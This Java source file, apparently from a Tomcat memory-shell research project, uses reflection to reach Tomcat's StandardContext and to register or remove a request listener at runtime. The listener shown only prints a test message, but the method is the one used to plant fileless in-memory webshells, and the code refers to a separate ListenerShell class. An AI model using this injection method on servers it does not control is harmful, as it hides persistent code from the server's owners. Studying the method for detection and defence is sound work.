package com.spkiddai.memoryserver.Test;

import com.spkiddai.memoryserver.Shell.ListenerShell;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

public class ListenerTest implements ServletRequestListener {

    // 当请求被初始化时调用的方法
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade request = (RequestFacade) servletRequestEvent.getServletRequest();
            Field f = request.getClass().getDeclaredField("request");
            f.setAccessible(true);
            Request req = (Request) f.get(request);
            req.getResponse().getWriter().println("ListenerTest Registration Example");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 当请求被销毁时调用的方法
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    /**
     * 向Tomcat注册监听器
     *
     * @param request 当前的HttpServletRequest请求对象
     */
    public void addListener(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();
        StandardContext context = getContext(servletContext);

        // 创建ListenerTest实例
        ServletRequestListener listener = new ListenerTest();

        // 添加监听器
        context.addApplicationEventListener(listener);
    }

    /**
     * 从Tomcat中删除指定的监听器。
     *
     * @param request 当前的HttpServletRequest请求对象
     */
    public void rmListener(HttpServletRequest request) throws Exception {
        ServletContext servletContext = request.getServletContext();
        StandardContext context = getContext(servletContext);

        List<Object> newListeners = new ArrayList<>();

        // 获取监听器
        Method getApplicationEventListenersMethod = context.getClass().getDeclaredMethod("getApplicationEventListeners");
        Object[] listeners = (Object[]) getApplicationEventListenersMethod.invoke(context);
        for (Object listener : listeners) {
            // 排除目标监听器
            if (!((listener instanceof ListenerTest) || (listener instanceof ListenerShell))) {
                newListeners.add(listener);
            }
        }
        // 设置新监听器
        Method setApplicationEventListenersMethod = context.getClass().getDeclaredMethod("setApplicationEventListeners", Object[].class);
        setApplicationEventListenersMethod.invoke(context, new Object[]{newListeners.toArray()});
    }

    /**
     * 从ServletContext中获取StandardContext对象
     *
     * @param servletContext Servlet上下文对象
     * @return 返回StandardContext对象
     */
    public static StandardContext getContext(ServletContext servletContext) throws Exception {
        StandardContext context = null;

        while (context == null) {
            Field f = servletContext.getClass().getDeclaredField("context");
            f.setAccessible(true);
            Object object = f.get(servletContext);

            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                context = (StandardContext) object;
            }
        }
        return context;
    }
}
